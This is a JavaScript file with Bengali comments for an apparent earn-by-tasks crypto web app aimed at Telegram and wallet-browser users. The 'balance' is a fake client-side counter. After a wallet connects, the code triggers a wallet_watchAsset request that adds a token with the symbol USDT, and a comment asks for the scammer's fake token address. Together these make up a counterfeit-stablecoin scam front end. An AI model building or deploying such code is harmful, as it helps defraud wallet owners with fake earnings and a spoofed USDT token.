let balance = 0.00;

/**
 * ১. সেকশন পরিবর্তন করার লজিক (Navigation Switcher)
 */
function switchPage(pageId, button) {
    document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(btn => btn.classList.remove('active'));
    
    document.getElementById(pageId).classList.add('active');
    button.classList.add('active');
    closeWalletModal();
}

/**
 * ২. টাস্ক কমপ্লিট এবং মেইন ব্যালেন্স যোগ করার লজিক
 */
function completeTask(reward, btn) {
    balance += reward;
    document.getElementById('user-balance').innerText = "$" + balance.toFixed(2);
    btn.innerText = "Completed";
    btn.disabled = true;
    btn.style.background = "#231e36";
    btn.style.boxShadow = "none";
    btn.style.color = "#6b7280";
}

/**
 * ৩. ওয়ালেট সিলেক্ট করার পপ-আপ (Modal Controls)
 */
function openWalletModal() {
    document.getElementById('walletModal').style.display = 'flex';
}

function closeWalletModal() {
    document.getElementById('walletModal').style.display = 'none';
}

// মোডালের বাইরের ব্যাকগ্রাউন্ডে ক্লিক করলে যেন পপ-আপ বন্ধ হয়ে যায়
document.getElementById('walletModal').addEventListener('click', function(e) {
    if (e.target === this) closeWalletModal();
});

/**
 * ৪. মোবাইল অ্যাপ ওপেন এবং অটো-কানেক্ট ডিপ লিঙ্ক প্রোটোকল (Core Router)
 */
async function connectViaApp(walletType) {
    closeWalletModal();
    
    // ধেপ ১: ইউজার যদি অলরেডি ট্রাস্ট ওয়ালেট বা মেটামাস্কের নিজস্ব ইন-আ্যাপ DApp ব্রাউজারে থাকে
    if (window.ethereum) {
        try {
            // ওয়ালেট কানেক্টের জন্য অফিশিয়াল পপ-আপ রিকোয়েস্ট
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const walletAddress = accounts[0];
            
            // সংক্ষিপ্ত অ্যাড্রেস তৈরি (যেমন: 0x1234...abcd)
            const truncated = walletAddress.substring(0,6) + "..." + walletAddress.substring(38);
            
            // wallet.html iframe-এর ভেতরে সিগন্যাল পাঠানো যাতে কানেক্ট বাটন লুকিয়ে উইথড্র স্ক্রিন আসে
            let walletFrame = document.getElementById('wallet').contentWindow;
            if(walletFrame && walletFrame.showWithdrawSection) {
                walletFrame.showWithdrawSection(walletAddress);
            }

            // ব্যাকগ্রাউন্ডে কাস্টম USDT টোকেন অ্যাড করার পপ-আপ ট্রিগার
            await window.ethereum.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: '0x0000000000000000000000000000000000000000', // আপনার ফেক টোকেনের অ্যাড্রেস এখানে দিন
                        symbol: 'USDT',
                        decimals: 18,
                        image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
                    },
                },
            });

        } catch (error) {
            console.error("User rejected or failed connection", error);
        }
    } 
    // ধাপ ২: ইউজার যদি টেলিগ্রাম অ্যাপের ভেতর থেকে লোগোতে চাপ দেয় (মোবাইল অ্যাপ ওপেন করার নিয়ম)
    else {
        let cleanUrl = window.location.href.replace('https://', '');
        
        if (walletType === 'trust') {
            // ট্রাস্ট ওয়ালেটের অফিশিয়াল ডিপ লিঙ্ক অ্যাপ্লিকেশন স্কিম (সরাসরি সেশন কানেক্ট ট্রাই করবে)
            window.location.href = "twa://tw/open_url?url=" + encodeURIComponent(window.location.href);
            
            // যদি ইউজারের ফোনে উপরের ডিরেক্ট স্কিম সাপোর্ট না করে, তবে অল্টারনেটিভ ক্লাউড রিডাইরেক্ট রান হবে
            setTimeout(() => {
                window.location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
            }, 600);
            
        } else if (walletType === 'metamask') {
            // মেটামাস্ক অ্যাপ সরাসরি ওপেন করার অফিশিয়াল প্রোটোকল
            window.location.href = "https://metamask.app.link/dapp/" + cleanUrl;
            
        } else {
            alert("Please open this application inside your Web3 Wallet's integrated DApp Browser.");
        }
    }
}
